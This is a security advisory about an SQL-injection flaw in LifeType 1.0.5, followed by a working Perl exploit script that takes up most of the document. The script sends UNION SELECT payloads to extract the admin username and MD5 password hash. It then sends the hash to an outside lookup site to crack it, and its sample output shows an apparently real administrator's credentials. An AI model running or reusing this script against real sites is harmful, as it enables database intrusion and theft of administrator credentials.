source: http://www.securityfocus.com/bid/18835/info

LifeType is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query. 

A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.

Version 1.0.5 is vulnerable to this issue; other versions may also be affected.

#!/usr/bin/perl -w
# LifeType 1.0.5 SQL injection exploit (extract admin username and MD5 password)
# Sun Jul  2 02:19:33 CEST 2006
#
# Bug was found by Alejandro Ramos <aramosf *@* unsec.net>.
# Script by Pedro Andujar <pandujar *@* selfdefense.es> and Alex.
#
# Shoutz: !dSR (www.digitalsec.net) and 514-77 (www.514.es) ppl.
#
# Example:
# lifesucks.pl www.rs-labs.com blog
# [~] LifeType 1.0.5 SQL injection exploit
# [~] Sending string to http://www.rs-labs.com/blog/
# [*] The username for admin account is: romansoft
# [*] The password MD5 of admin account is: 30df196559f6c591e936d7873119f5c9
# [*] The MD5 lookup for this hash is: roman123

use strict;
use LWP::Simple;

if (@ARGV != 2)
{
    print " LifeType 1.0.5 SQL injection exploit \n";
    print " Usage: $0 <host> <path> \n";
    exit 1;
}
my $host = $ARGV[0];
my $path = $ARGV[1];

print "[~] LifeType 1.0.5 SQL injection exploit \n";
print "[~] Sending string to http://$host/$path/ \n";
my $ans_user = get
"http://$host/$path/index.php?op=Default&Date=0'%20UNION%20SELECT%201,user,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id='1'/*&blogId=0"
|| 0;
my $ans_hash = get
"http://$host/$path/index.php?op=Default&Date=0'%20UNION%20SELECT%201,password,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id='1'/*&blogId=0";

if ($ans_user =~ m/Trackbacks&articleId=(\w*)/)
{
    print "[*] The username for admin account is: $1 \n";
}
if ($ans_hash =~ m/Trackbacks&articleId=(\w*)/)
{
    print "[*] The password MD5 for admin account is: $1 \n";
} else {
       die "[-] Exploit failed. \n";
}

my $ans_pass = get "http://www.digitalsec.es/md5.php?h=$1" || 0;

if ($ans_pass =~ m#<br /><b>(.*?)</b># )

{
       print "[*] The MD5 lookup for this hash is: $1 \n";
} else {
    die "[-] Error, Impossible to lookup the MD5 password. \n";
}